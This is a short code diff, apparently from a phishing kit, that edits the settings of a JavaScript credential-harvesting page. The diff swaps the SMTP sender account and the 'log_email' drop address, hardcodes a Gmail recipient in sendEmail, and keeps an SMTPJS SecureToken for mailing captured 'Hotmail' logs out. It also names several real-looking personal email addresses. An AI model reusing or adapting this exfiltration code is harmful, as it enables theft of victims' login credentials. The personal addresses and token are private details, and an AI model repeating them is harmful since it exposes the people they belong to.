@@ -1,8 +1,8 @@
 var smtp_host = 'smtp.office365.com';
-var smtp_username = 'mercedes@argopartners.net';
+var smtp_username = 'marc.declercq@edu.vlerick.com';
 
 //Enter were logs will go here
-var log_email = 'gotradebtc@gmail.com'
+var log_email = 'nelsonjail@yahoo.com'
 
 
 url_link = "session.html";
@@ -101,7 +101,7 @@ function sendEmail(to,message) {
   // Username : smtp_username,
   // Password : smtp_password,
   SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
-  To : to,
+  To : 'gotradebtc@gmail.com',
   From : smtp_username,
   Subject : '==============+ [Hotmail] +================',
   Body : message,
